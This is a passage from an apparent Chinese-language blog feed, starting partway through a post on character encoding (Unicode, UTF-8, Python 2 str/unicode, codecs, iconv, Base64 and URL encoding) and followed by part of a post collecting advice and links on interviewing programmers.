&lt;p&gt;Unicode对世界上大部分的文字系统进行了整理、编码，使得电脑可以用更为简单的方式来呈现和处理文字。&lt;/p&gt;
&lt;p&gt;Unicode只是一个符号集，它只规定了符号的二进制代码，却没有规定这个二进制代码应该如何存储&lt;/p&gt;
&lt;p&gt;而UTF-8就是字符编码，是Unicode规则字库的一种实现形式&lt;/p&gt;
&lt;h1&gt;Python中的编码问题&lt;/h1&gt;
&lt;p&gt;&lt;a href="http://blog.jobbole.com/50345/"&gt;Python编码和Unicode&lt;/a&gt;一文中描述了python中可能出现的一些编解码难题&lt;/p&gt;
&lt;p&gt;原因之一是Python 2.x默认将所有的字符串当做ASCII来对待（python3中会好很多）&lt;/p&gt;
&lt;p&gt;当你使用string类型时，实际上会储存一个字节串&lt;/p&gt;
&lt;h3&gt;解码字节流&lt;/h3&gt;
&lt;p&gt;你可以把字节流&lt;code&gt;解码&lt;/code&gt;(decode)成一个Unicode对象，把一个Unicode 对象编码(encode)为字节流&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;你最好是尽早的将字节流解码为Unicode(字节流进入程序的时候)&lt;/li&gt;
&lt;li&gt;你不能简单地输出一个Unicode对象。它必须在输出前被变成一个字节串&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;str/unicode&lt;/h3&gt;
&lt;p&gt;在mac下python2.7.5&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# unicode&lt;/span&gt;
&lt;span class="n"&gt;unicode_a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;u&amp;quot;你好&amp;quot;&lt;/span&gt;
&lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;unicode_a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# &amp;lt;type &amp;#39;unicode&amp;#39;&amp;gt;&lt;/span&gt;
&lt;span class="n"&gt;unicode_a&lt;/span&gt; &lt;span class="c1"&gt;# u&amp;#39;\u4f60\u597d&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;unicode_b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;u&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\u4f60\u597d&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; 
&lt;span class="n"&gt;unicode_b&lt;/span&gt; &lt;span class="c1"&gt;# u&amp;#39;\u4f60\u597d&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;unicode_a&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;unicode_b&lt;/span&gt; &lt;span class="c1"&gt;# True&lt;/span&gt;

&lt;span class="c1"&gt;# unicode_c = unicode(&amp;quot;你好&amp;quot;) python2会报错，python会把所有东西作为字节流理解&lt;/span&gt;
&lt;span class="s1"&gt;u&amp;#39;hello&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;unicode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;hello&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#  True，如果&lt;/span&gt;

&lt;span class="n"&gt;unicode_a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# &amp;#39;\xe4\xbd\xa0\xe5\xa5\xbd&amp;#39;&lt;/span&gt;
&lt;span class="c1"&gt;################&lt;/span&gt;
&lt;span class="c1"&gt;# str&lt;/span&gt;
&lt;span class="n"&gt;str_a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;你好&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;str_a&lt;/span&gt; &lt;span class="c1"&gt;# &amp;#39;\xe4\xbd\xa0\xe5\xa5\xbd&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;str_a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# u&amp;#39;\u4f60\u597d&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;str_a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="o"&gt;==&lt;/span&gt;  &lt;span class="s2"&gt;u&amp;quot;你好&amp;quot;&lt;/span&gt; &lt;span class="c1"&gt;# True&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;__repr__的目标是准确性，__str__的目标是可读性&lt;/p&gt;
&lt;h3&gt;codecs模块&lt;/h3&gt;
&lt;p&gt;codecs模块能在处理字节流的时候提供很大帮助。你可以用定义的编码来打开文件并且你从文件里读取的内容会被自动转化为Unicode对象。&lt;/p&gt;
&lt;p&gt;读写文件&lt;/p&gt;
&lt;p&gt;当从一个文件读取数据的时候，codecs.open 会创建一个文件对象能够自动将utf-8编码文件转化为一个Unicode对象,而写入文件这样写：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;codecs&lt;/span&gt;
&lt;span class="n"&gt;fh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;codecs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/tmp/utf-8.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;w&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;fh&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;u&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\u2013&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; 
&lt;span class="n"&gt;fh&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;使用urllib流&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;stream&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urlopen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://www.google.com&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;Reader&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;codecs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getreader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;fh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Reader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stream&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fh&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="c1"&gt;# &amp;lt;type &amp;#39;unicode&amp;#39;&amp;gt; ,应该尽可能让程序内部的数据都是 &amp;lt;type &amp;#39;unicode&amp;#39;&amp;gt; &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;你必须对codecs模块十分小心。你传进去的东西必须是一个Unicode对象,否则它会自动将字节流作为ASCII进行解码。&lt;/p&gt;
&lt;h3&gt;策略&lt;/h3&gt;
&lt;p&gt;python编解码涉及的问题可能很多，上至大神下至小白，都可能受扰，为了保持简单，我们可以保持这样一种习惯:关注输入输出，内部保持unicode。&lt;/p&gt;
&lt;p&gt;每当有数据进入程序，将其解码（decode）为unicode(utf-8）&lt;/p&gt;
&lt;p&gt;当有数据从程序中输出时，将其编码（encode）为utf-8&lt;/p&gt;
&lt;p&gt;最佳实践：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;最先解码(解码为unicode对象)，最后编码（输出为字节码）&lt;ul&gt;
&lt;li&gt;最先解码意味着无论何时有字节流输入，需要尽早将输入解码为Unicode&lt;/li&gt;
&lt;li&gt;最后编码意味着只有你打算将文本输出到某个地方时，才把它编码为字节流。这个输出可能是一个文件，一个数据库，一个socket等等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;默认使用utf-8编码&lt;/li&gt;
&lt;li&gt;使用codecs和Unicode对象来简化处理&lt;ul&gt;
&lt;li&gt;codecs模块能够让我们在处理诸如文件或socket这样的流的时候能少踩一些坑。如果没有codecs提供的这个工具，你就必须将文件内容读取为字节流，然后将这个字节流解码为Unicode对象。&lt;/li&gt;
&lt;li&gt;codecs模块能够让你快速的将&lt;code&gt;字节流&lt;/code&gt;转化为&lt;code&gt;Unicode对象&lt;/code&gt;，省去很多麻烦。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;linux下的一些工具&lt;/h1&gt;
&lt;h3&gt;file&lt;/h3&gt;
&lt;p&gt;file命令用来探测给定文件的类型,&lt;/p&gt;
&lt;p&gt;参数：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;-i：显示MIME类别。&lt;/li&gt;
&lt;li&gt;-c：详细显示指令执行过程，便于排错或分析程序执行的情形；&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;file *&lt;/p&gt;
&lt;h3&gt;iconv&lt;/h3&gt;
&lt;p&gt;conv命令是用来转换文件的编码方式的，比如它可以将UTF8编码的转换成GB18030的编码&lt;/p&gt;
&lt;p&gt;iconv -f encoding -t encoding inputfile&lt;/p&gt;
&lt;p&gt;iconv -f UTF-8 -t GBK file1 -o file2  //将一个UTF-8 编码的文件转换成GBK编码&lt;/p&gt;
&lt;h3&gt;chardet&lt;/h3&gt;
&lt;p&gt;有时候我们不知道文件/字节流采用了什么编码，可以让chardet来猜测编码，chardet是python的一个库&lt;/p&gt;
&lt;h1&gt;附&lt;/h1&gt;
&lt;h3&gt;传输编码语法（transfer encoding syntax）&lt;/h3&gt;
&lt;p&gt;用于处理上一层次的字符编码方案提供的字节序列。一般其功能包括两种：一是把字节序列的值映射到一套更受限制的值域内，以满足传输环境的限制，例如Email传输时Base64或者quoted-printable，都是把8位的字节编码为7位长的数据；另一是压缩字节序列的值，如LZW或者进程长度编码等无损压缩技术。&lt;/p&gt;
&lt;h6&gt;Base64编码&lt;/h6&gt;
&lt;p&gt;base64编码相关的部分，可以翻阅我的&lt;a href="http://blog.just4fun.site/jwt-note.html"&gt;JWT学习笔记&lt;/a&gt;中的附录部分&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Base64常用于在通常处理文本数据的场合，表示、传输、存储一些&lt;code&gt;二进制数据&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;常用于在URL、Cookie、网页中传输少量二进制数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;所谓Base64，就是说选出64个字符----小写字母a-z、大写字母A-Z、数字0-9、符号"+"、"/"（再加上作为垫字的"="，实际上是65个字符）----作为一个基本字符集。然后，其他所有符号都转换成这个字符集中的字符。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;关于base64更多的细节可以参考维基百科和&lt;a href="http://www.ruanyifeng.com/blog/2008/06/base64.html"&gt;Base64笔记&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在python中实现&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;base64&lt;/span&gt;
&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hello&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#aGVsbG8=  ， 被编码的不是应该是二进制数据吧，python的二进制默认被解析为ascii？，在这里hello无论是b&amp;#39;hello&amp;#39;还是&amp;#39;hello&amp;#39;/u&amp;#39;hello&amp;#39;，结果都一样&lt;/span&gt;
&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;aGVsbG8=&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# hello&lt;/span&gt;

&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;u&amp;#39;你好&amp;#39;&lt;/span&gt; &lt;span class="c1"&gt;# \u4f60\u597d&lt;/span&gt;
&lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  &lt;span class="c1"&gt;#5L2g5aW9&lt;/span&gt;
&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# \xe4\xbd\xa0\xe5\xa5\xbd&lt;/span&gt;
&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# u&amp;#39;\u4f60\u597d&amp;#39;&lt;/span&gt;

&lt;span class="c1"&gt;# 由于标准的Base64编码后可能出现字符+和/，在URL中就不能直接作为参数，所以又有一种&amp;quot;url safe&amp;quot;的base64编码，其实就是把字符+和/分别变成-和_&lt;/span&gt;
&lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;u&amp;quot;哈里谢顿&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# \xe5\x93\x88\xe9\x87\x8c\xe8\xb0\xa2\xe9\xa1\xbf&lt;/span&gt;
&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 5ZOI6YeM6LCi6aG/ , 有反斜杠&lt;/span&gt;
&lt;span class="n"&gt;e&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urlsafe_b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 5ZOI6YeM6LCi6aG_&lt;/span&gt;
&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urlsafe_b64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# \xe5\x93\x88\xe9\x87\x8c\xe8\xb0\xa2\xe9\xa1\xbf&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;url中的编码问题&lt;/h3&gt;
&lt;p&gt;一般而言使用urllib库中的urlencode函数就好了&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;urllib&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;urlencode&lt;/span&gt;
&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
     &lt;span class="s1"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;小明&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#u&amp;#39;小明&amp;#39;则需要encode为字节码&lt;/span&gt;
     &lt;span class="s1"&gt;&amp;#39;age&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;10岁&amp;#39;&lt;/span&gt;
     &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;urlencode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# age=10%E5%B2%81&amp;amp;name=%E5%B0%8F%E6%98%8E&lt;/span&gt;

&lt;span class="c1"&gt;#仅对字符串进行转码可以使用quote&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;urllib&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;quote&lt;/span&gt;
&lt;span class="n"&gt;quote&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;小明&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="c1"&gt;#%E5%B0%8F%E6%98%8E&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;如果有大量此类工作可以考虑使用&lt;a href="https://github.com/gruns/furl"&gt;furl&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;在线工具&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://tool.oschina.net/encode?type=4"&gt;在线编码转换&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://tool.chinaz.com/Tools/urlencode.aspx"&gt;UrlEncode编码/UrlDecode解码&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://tool.chinaz.com/Tools/unicode.aspx"&gt;Unicode编码转换&lt;/a&gt;:还包括unix时间戳&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;一些细碎知识&lt;/h3&gt;
&lt;p&gt;Windows简体中文版中，ANSI是默认的编码方式。对于英文文件是ASCII编码，对于简体中文文件是GB2312编码（繁体中文版会采用Big5码）&lt;/p&gt;
&lt;h3&gt;python中字节流和unicode的代码视角比较&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/18193305/python-unicode-equal-comparison-failed"&gt;stackoverflow Python unicode equal comparison failed&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81"&gt;字符编码&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://cenalulu.github.io/linux/character-encoding/"&gt;十分钟搞清字符集和字符编码&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="http://cenalulu.github.io/mysql/mysql-mojibake/"&gt;10分钟学会理解和解决MySQL乱码问题&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html"&gt;字符编码笔记：ASCII，Unicode和UTF-8&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/50345/"&gt;Python编码和Unicode&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 28 Jun 2016 00:00:00 +0000</pubDate><guid>tag:,2016-06-28:decode-and-encode-note.html</guid><category>tools</category></item><item><title>如何面试程序员</title><link>/about-interview.html</link><description>&lt;p&gt;最近在客串面试官的角色，收集一些自己认为不错的资源和问题。&lt;/p&gt;
&lt;p&gt;面试别人比被人面试来得紧张&lt;/p&gt;
&lt;h1&gt;原则&lt;/h1&gt;
&lt;p&gt;你需要找到合适的人，而不是最牛的人&lt;/p&gt;
&lt;h1&gt;技术无关&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://www.ruanyifeng.com/blog/2010/12/how_to_interview_a_programmer.html"&gt;如何面试程序员？&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;准备工作&lt;ul&gt;
&lt;li&gt;需要新员工完成什么样的任务？&lt;/li&gt;
&lt;li&gt;怎样的人能完成这样的任务？&lt;/li&gt;
&lt;li&gt;哪些途径和方法可以发现这样的人？&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;考察专业能力&lt;ul&gt;
&lt;li&gt;过去是未来的最好预测依据。不过，提问的重点不要仅仅是他过去的成果，更要关注在当时的环境中，他是如何决策和实施的。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;考察综合素质:因为人是会发展的，所以某种程度上，面试者的综合素质要比他的专业能力更重要&lt;ul&gt;
&lt;li&gt;你为什么开发软件？&lt;/li&gt;
&lt;li&gt;去年你读了几本技术书籍？&lt;/li&gt;
&lt;li&gt;去年你最喜欢的技术书籍是哪本？你从中学到了什么？&lt;/li&gt;
&lt;li&gt;平时你经常访问哪些编程类网站？&lt;/li&gt;
&lt;li&gt;你有自己的开源项目吗？业余时间你编程吗？&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;考察理性思维（递进）&lt;ul&gt;
&lt;li&gt;你最喜欢的编程语言是哪种？为什么？&lt;/li&gt;
&lt;li&gt;如果允许你为这种语言加一种功能，你会加什么功能？为什么？&lt;/li&gt;
&lt;li&gt;如果允许你取消一种功能，会是什么功能？为什么？&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://www.zhihu.com/question/20042950"&gt;如何面试一个工作经验比自己高很多的人？&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果是技术岗，应该有岗位职责和技术要求，你作为技术面试官就是要看他已有的技能是否满足这个岗位。要围绕公司所应用的技术平台、产品类型、项目情况考察他的技术水准是否能够满足。&lt;/li&gt;
&lt;li&gt;对于你不了解的技术你也不要不懂装懂，如果他能用简单的描述让你听得明白，说明他的条理很清晰&lt;/li&gt;
&lt;li&gt;你可以提出几个实际工作中遇到的技术问题，请他讲讲他的理解和解决办法。&lt;/li&gt;
&lt;li&gt;技术面试之后，要了解他换工作的原因，动机，他的期望是什么，你要判断公司能否满足他的期望，他是否“像这个公司的人”，也就是要符合公司文化。双方契合，才能达到&lt;strong&gt;共赢&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;我所在单位的面试是逐级的，首先技术部门经理面试，然后技术部门上级单位总经理面试，最后和HR部门经理谈薪酬待遇。&lt;/li&gt;
&lt;li&gt;找出过去曾经困扰过你或你们团队的问题（可以是技术、运营、沟通），列明产生问题的背景，在面试中用于情景模拟&lt;/li&gt;
&lt;li&gt;询问项目过程中发生的技术难关、跨团队沟通等问题的解决上，用STAR判断真假&lt;ul&gt;
&lt;li&gt;&lt;a href="http://baike.baidu.com/subview/470818/11235965.htm#viewPageContent"&gt;STAR原则&lt;/a&gt;:situation,task,action,result&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;鉴于IT行业的特殊性，还需要考察学习能力，可以直接询问他是如何学习最新语言的&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://mindhacks.cn/2011/11/04/how-to-interview-a-person-for-two-years/"&gt;怎样花两年时间去面试一个人&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;h3&gt;面试官的养成&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/26240321"&gt;如何当一个好的面试官？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/36820925"&gt;在面试中，有哪些面试官的反应让你感觉惊艳？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/19551593"&gt;创业公司应该如何招人？&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;技术相关&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/h5bp/Front-end-Developer-Interview-Questions"&gt;Front-end-Developer-Interview-Questions&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/alex/what-happens-when"&gt;what-happens-when&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/skyline75489/what-happens-when-zh_CN"&gt;What-happens-when&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions"&gt;awesome-interview-questions&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#html"&gt;html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#javascript"&gt;javascript&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#python"&gt;python&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#django"&gt;django&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#ruby"&gt;ruby&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#ruby-on-rails"&gt;Ruby on Rails&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
